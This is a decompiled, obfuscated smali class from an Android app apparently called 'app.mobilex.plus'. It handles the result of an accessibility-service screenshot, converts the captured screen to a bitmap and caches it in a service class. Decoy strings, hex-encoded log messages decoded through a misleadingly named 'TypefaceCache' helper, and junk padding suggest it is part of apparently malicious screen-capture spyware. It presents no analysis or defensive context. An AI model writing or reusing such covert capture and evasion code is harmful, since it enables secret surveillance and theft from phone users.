.class public final Lv/s/NuEgjpX2tI5BrfFMcX0;
.super Ljava/lang/Object;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"

# interfaces
.implements Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;


# instance fields
.field public final synthetic dDIMxZXP1V8HdM:Lv/s/deLJ4Z0aL3hcJ3O1;


# direct methods
.method public constructor <init>(Lv/s/deLJ4Z0aL3hcJ3O1;)V
    .locals 0

    .line 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 2
    .line 3
    .line 4
    iput-object p1, p0, Lv/s/NuEgjpX2tI5BrfFMcX0;->dDIMxZXP1V8HdM:Lv/s/deLJ4Z0aL3hcJ3O1;

    .line 5
    .line 6
    return-void
.end method

.method private static synthetic hinxl()V
    .locals 1

    const-string v0, "utf-8"

    const-string v0, "com.manager.yrziubi"

    const-string v0, "TAG"

    const-string v0, "http://"

    const-string v0, "net.helper.vbeaga"

    const-string v0, "accent"

    const-string v0, "Picasso"

    const-string v0, "scroll"

    const-string v0, "net.data.lnxvo"

    const-string v0, "ISO-8859-1"

    return-void
.end method


# virtual methods
.method public final onFailure(I)V
    .locals 1

    .line 1
    iget-object p1, p0, Lv/s/NuEgjpX2tI5BrfFMcX0;->dDIMxZXP1V8HdM:Lv/s/deLJ4Z0aL3hcJ3O1;

    .line 2
    .line 3
    if-eqz p1, :cond_0

    nop

    nop

    .line 4
    .line 5
    const/4 v0, 0x0

    .line 6
    invoke-interface {p1, v0}, Lv/s/deLJ4Z0aL3hcJ3O1;->pyu8ovAipBTLYAiKab(Ljava/lang/Object;)Ljava/lang/Object;

    .line 7
    .line 8
    .line 9
    :cond_0
    return-void
.end method

.method public final onSuccess(Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)V
    .locals 5

    .line 1
    invoke-static {p1}, Lv/s/VhkhkItRHoue;->ibVTtJUNfrGYbW(Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)Landroid/hardware/HardwareBuffer;

    .line 2
    .line 3
    .line 4
    move-result-object v0

    .line 5
    const/4 v1, 0x0

    .line 6
    :try_start_0
    sget-object v2, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;
    :try_end_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_0 .. :try_end_0} :catch_4
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3
    .catchall {:try_start_0 .. :try_end_0} :catchall_2

    .line 7
    .line 8
    :try_start_1
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 9
    .line 10
    .line 11
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getPrevHwBitmap$cp()Landroid/graphics/Bitmap;

    .line 12
    .line 13
    .line 14
    move-result-object v2

    .line 15
    if-eqz v2, :cond_0

    .line 16
    .line 17
    invoke-virtual {v2}, Landroid/graphics/Bitmap;->recycle()V

    .line 18
    .line 19
    .line 20
    :cond_0
    invoke-static {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setPrevHwBitmap$cp(Landroid/graphics/Bitmap;)V
    :try_end_1
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1 .. :try_end_1} :catch_6
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_5
    .catchall {:try_start_1 .. :try_end_1} :catchall_2

    .line 21
    .line 22
    .line 23
    :try_start_2
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getPrevHardwareBuffer$cp()Landroid/hardware/HardwareBuffer;

    .line 24
    .line 25
    .line 26
    move-result-object v2

    .line 27
    if-eqz v2, :cond_1

    .line 28
    .line 29
    invoke-virtual {v2}, Landroid/hardware/HardwareBuffer;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2 .. :try_end_2} :catch_6
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    .line 30
    .line 31
    .line 32
    :catch_0
    :cond_1
    :try_start_3
    invoke-static {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setPrevHardwareBuffer$cp(Landroid/hardware/HardwareBuffer;)V
    :try_end_3
    .catch Ljava/lang/OutOfMemoryError; {:try_start_3 .. :try_end_3} :catch_6
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_5
    .catchall {:try_start_3 .. :try_end_3} :catchall_2

    .line 33
    .line 34
    .line 35
    :try_start_4
    invoke-static {p1}, Lv/s/VhkhkItRHoue;->Ee8d2j4S9Vm5yGuR(Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)Landroid/graphics/ColorSpace;

    .line 36
    .line 37
    .line 38
    move-result-object p1

    .line 39
    invoke-static {v0, p1}, Lv/s/JW3Lh9hxwLsO2ArTlH;->vekpFI4d1Nc4fakF(Landroid/hardware/HardwareBuffer;Landroid/graphics/ColorSpace;)Landroid/graphics/Bitmap;

    .line 40
    .line 41
    .line 42
    move-result-object p1
    :try_end_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_4 .. :try_end_4} :catch_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    .line 43
    if-nez p1, :cond_3

    .line 44
    .line 45
    :try_start_5
    iget-object v2, p0, Lv/s/NuEgjpX2tI5BrfFMcX0;->dDIMxZXP1V8HdM:Lv/s/deLJ4Z0aL3hcJ3O1;

    .line 46
    .line 47
    if-eqz v2, :cond_2

    .line 48
    .line 49
    invoke-interface {v2, v1}, Lv/s/deLJ4Z0aL3hcJ3O1;->pyu8ovAipBTLYAiKab(Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_5
    .catch Ljava/lang/OutOfMemoryError; {:try_start_5 .. :try_end_5} :catch_2
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    .line 50
    .line 51
    .line 52
    goto :goto_0

    .line 53
    :catchall_0
    move-exception v1

    .line 54
    goto/16 :goto_9

    nop

    nop

    .line 55
    .line 56
    :catch_1
    move-exception v2

    .line 57
    goto/16 :goto_5

    .line 58
    :catch_2
    move-exception v2

    .line 59
    goto :goto_7

    .line 60
    :cond_2
    :goto_0
    :try_start_6
    invoke-virtual {v0}, Landroid/hardware/HardwareBuffer;->close()V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_1

    .line 61
    .line 62
    .line 63
    goto/16 :goto_8

    .line 64
    :catchall_1
    return-void

    .line 65
    :cond_3
    :try_start_7
    iget-object v2, p0, Lv/s/NuEgjpX2tI5BrfFMcX0;->dDIMxZXP1V8HdM:Lv/s/deLJ4Z0aL3hcJ3O1;

    .line 66
    .line 67
    if-eqz v2, :cond_4

    .line 68
    .line 69
    invoke-interface {v2, p1}, Lv/s/deLJ4Z0aL3hcJ3O1;->pyu8ovAipBTLYAiKab(Ljava/lang/Object;)Ljava/lang/Object;

    .line 70
    .line 71
    .line 72
    :cond_4
    invoke-static {p1}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setPrevHwBitmap$cp(Landroid/graphics/Bitmap;)V

    .line 73
    .line 74
    .line 75
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setPrevHardwareBuffer$cp(Landroid/hardware/HardwareBuffer;)V
    :try_end_7
    .catch Ljava/lang/OutOfMemoryError; {:try_start_7 .. :try_end_7} :catch_2
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_1
    .catchall {:try_start_7 .. :try_end_7} :catchall_0

    .line 76
    .line 77
    .line 78
    goto/16 :goto_8

    .line 79
    :catchall_2
    move-exception p1

    .line 80
    move-object v4, v1

    .line 81
    move-object v1, p1

    .line 82
    move-object p1, v4

    .line 83
    goto/16 :goto_9

    .line 84
    :catch_3
    move-exception v2

    nop

    .line 85
    :goto_1
    move-object p1, v1

    nop

    nop

    .line 86
    goto/16 :goto_5

    .line 87
    :catch_4
    move-exception v2

    .line 88
    :goto_2
    move-object p1, v1

    nop

    nop

    .line 89
    goto/16 :goto_7

    .line 90
    :goto_3
    move-object v2, p1

    .line 91
    goto :goto_1

    .line 92
    :goto_4
    move-object v2, p1

    .line 93
    goto :goto_2

    .line 94
    :catch_5
    move-exception p1

    .line 95
    goto :goto_3

    nop

    .line 96
    :catch_6
    move-exception p1

    .line 97
    goto/16 :goto_4

    .line 98
    :goto_5
    :try_start_8
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 99
    .line 100
    .line 101
    const-string v3, "00200077004B009300E500AD00D7009400200064005E008200FE009600DC00B3002600640055008600FC009D00DB00B3002E0077004B00C700F500AD00C000A80031002C001B"

    .line 102
    .line 103
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 104
    .line 105
    .line 106
    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 107
    .line 108
    .line 109
    iget-object v2, p0, Lv/s/NuEgjpX2tI5BrfFMcX0;->dDIMxZXP1V8HdM:Lv/s/deLJ4Z0aL3hcJ3O1;

    .line 110
    .line 111
    if-eqz v2, :cond_5

    .line 112
    .line 113
    invoke-interface {v2, v1}, Lv/s/deLJ4Z0aL3hcJ3O1;->pyu8ovAipBTLYAiKab(Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_0

    .line 114
    .line 115
    .line 116
    :cond_5
    if-eqz p1, :cond_6

    .line 117
    .line 118
    :goto_6
    :try_start_9
    invoke-virtual {p1}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_3

    .line 119
    .line 120
    .line 121
    :catchall_3
    :cond_6
    :try_start_a
    invoke-virtual {v0}, Landroid/hardware/HardwareBuffer;->close()V
    :try_end_a
    .catchall {:try_start_a .. :try_end_a} :catchall_4

    .line 122
    .line 123
    .line 124
    goto :goto_8

    .line 125
    :goto_7
    :try_start_b
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 126
    .line 127
    .line 128
    const-string v3, "000C0059007600C700F900B1009200A400220066004F009200E200BA00E100A400310073005E008900D900B100C600A200310078005A008B00D200B600C600AA00220066000100C7"

    .line 129
    .line 130
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 131
    .line 132
    .line 133
    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 134
    .line 135
    .line 136
    invoke-static {}, Ljava/lang/System;->gc()V

    .line 137
    .line 138
    .line 139
    iget-object v2, p0, Lv/s/NuEgjpX2tI5BrfFMcX0;->dDIMxZXP1V8HdM:Lv/s/deLJ4Z0aL3hcJ3O1;

    .line 140
    .line 141
    if-eqz v2, :cond_7

    .line 142
    .line 143
    invoke-interface {v2, v1}, Lv/s/deLJ4Z0aL3hcJ3O1;->pyu8ovAipBTLYAiKab(Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_0

    .line 144
    .line 145
    .line 146
    :cond_7
    if-eqz p1, :cond_6

    nop

    .line 147
    .line 148
    goto :goto_6

    .line 149
    :catchall_4
    :goto_8
    return-void

    .line 150
    :goto_9
    if-eqz p1, :cond_8

    .line 151
    .line 152
    :try_start_c
    invoke-virtual {p1}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_c
    .catchall {:try_start_c .. :try_end_c} :catchall_5

    .line 153
    .line 154
    .line 155
    :catchall_5
    :cond_8
    :try_start_d
    invoke-virtual {v0}, Landroid/hardware/HardwareBuffer;->close()V
    :try_end_d
    .catchall {:try_start_d .. :try_end_d} :catchall_6

    .line 156
    .line 157
    .line 158
    :catchall_6
    throw v1
.end method
